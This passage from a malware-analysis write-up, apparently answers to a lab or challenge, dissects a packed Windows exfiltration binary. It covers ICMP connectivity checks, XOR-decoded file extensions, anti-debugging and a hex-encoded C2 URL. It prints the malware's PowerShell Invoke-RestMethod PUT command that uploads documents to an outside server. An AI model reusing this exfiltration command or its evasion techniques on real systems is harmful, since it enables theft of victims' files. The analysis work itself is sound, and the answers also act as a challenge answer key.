w00t
```

**Discovery Method:**
1. Located string "w00t" at offset 0x4B00 in unpacked binary
2. Found in context of ICMP functionality using IcmpSendEcho API
3. Hexdump analysis shows: `77 30 30 74` = "w00t"
4. Used as ICMP echo request payload to verify connectivity to C2 server

**Evidence:**
```
00004b00  77 30 30 74 00 00 00 00  5c 00 2a 00 00 00 00 00  |w00t....\.*.....|
```

**Purpose:** Initial connectivity check before attempting file exfiltration

---

### Question 4: Decoded Upload URL Prefix
**Task:** What is the decoded upload URL prefix used in the PowerShell exfiltration command?

**Answer:**
```
http://203.0.113.42:8000/
```

**Discovery Method:**
1. Located PowerShell command construction in binary (UTF-16LE encoded)

   ```
   0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,
   0x32,0x30,0x33,0x2E,0x30,0x2E,0x31,0x31,0x33,0x2E,0x34,0x32,
   0x3A,0x38,0x30,0x30,0x30,0x2F
   ```
3. Decoded using Python: `''.join(chr(b) for b in hex_bytes)`
4. Result: `http://203.0.113.42:8000/`

**PowerShell Command Structure:**
```powershell
$abc = [System.Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74...)) + '/';
Invoke-RestMethod -Uri $abc -Method Put -InFile '<filepath>'
```

---

### Question 5: PowerShell Execution Function
**Task:** Which function does the malware call to execute the assembled PowerShell command string? Provide the exact C runtime/WINAPI call used in the code.

**Answer:**
```
_wsystem
```

**Discovery Method:**
1. Searched unpacked binary strings for system execution functions
2. Found `_wsystem` in the import/string table
3. Verified using: `strings -a unpacked.exe | grep -i wsystem`
4. Result: `_wsystem` (Wide character version of system() C runtime function)

**Function Purpose:**
- C runtime function for executing shell commands
- Wide character version (_w prefix) for Unicode support
- Executes dynamically constructed PowerShell command
- No CreateProcess or ShellExecute used - direct CRT call

---

### Question 6: Networking DLLs

   - **IPHLPAPI.DLL**: IP Helper API (ICMP functions)

**Specific Functions Imported:**
- From IPHLPAPI.DLL:
  - `IcmpCreateFile` - Creates ICMP handle
  - `IcmpSendEcho` - Sends ICMP echo request (ping)
  - `IcmpCloseHandle` - Closes ICMP handle
- From WS2_32.dll:
  - Network address conversion functions
  - Socket operations for HTTP communication

---

### Question 7: Exfiltration Methodology
**Task:** How was the exfiltration functionality delivered and executed on the compromised system? Make sure to specify how the code that performs scanning and upload runs on the host, where the uploads are sent, the file types targeted, and the exact mechanism used to perform the upload.

**Answer:**

The exfiltration functionality is **embedded directly within the malware executable itself**, executing natively on the compromised host with no additional payloads downloaded. 

**Complete Attack Chain:**

**1. Anti-Debugging & Initialization**
- Malware performs anti-debugging checks at startup:
  - `IsDebuggerPresent()` - Detects debugger attachment
  - `CheckRemoteDebuggerPresent()` - Detects remote debugging
- If debugger detected, malware terminates to evade analysis

**2. Connectivity Verification**
- Uses ICMP to verify C2 server reachability:
  - Target: `203.0.113.42`
  - Method: `IcmpSendEcho()` API call
  - Payload: `"w00t"` string in ICMP packet
  - Purpose: Confirms network path to exfiltration server

**3. Filesystem Reconnaissance**
- Recursively scans the file system starting from `C:\`
- Uses Windows File APIs:
  - `FindFirstFileW()` - Initiates directory enumeration
  - `FindNextFileW()` - Continues file enumeration
- Target file extensions (XOR-decoded at runtime with key 0x7a):
  - `.pdf` - PDF documents
  - `.doc` - Word documents (legacy)
  - `.docx` - Word documents (modern)
  - `.xls` - Excel spreadsheets
  - `.msg` - Outlook email messages

**4. PowerShell Command Construction**
- For each discovered target file, malware dynamically constructs PowerShell command
- Command structure (stored as UTF-16LE in binary):
```powershell
powershell -Command "$abc = [System.Text.Encoding]::UTF8.GetString([byte[]](
0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,
0x32,0x30,0x33,0x2E,0x30,0x2E,0x31,0x31,0x33,0x2E,0x34,0x32,
0x3A,0x38,0x30,0x30,0x30,0x2F)) + '/'; 
Invoke-RestMethod -Uri $abc -Method Put -InFile '<filepath>'"
```

**5. Command Execution & Upload**
- Execution mechanism: `_wsystem()` C runtime function
- URL decoded at runtime: `http://203.0.113.42:8000/`
- Upload method: PowerShell's `Invoke-RestMethod` cmdlet
- HTTP method: `PUT` requests
- Each file uploaded individually to attacker's server

**Key Technical Details:**
- **Delivery:** Native code execution (no downloaded payloads)
- **Persistence:** Single-run exfiltration (no persistence mechanism)
- **Obfuscation:** UPX packing + XOR encoding + hex-encoded strings
- **Evasion:** Anti-debugging + runtime decoding
- **Upload destination:** `http://203.0.113.42:8000/`
- **Targeted data:** Office documents and email messages
- **Upload mechanism:** Individual HTTP PUT per file via PowerShell
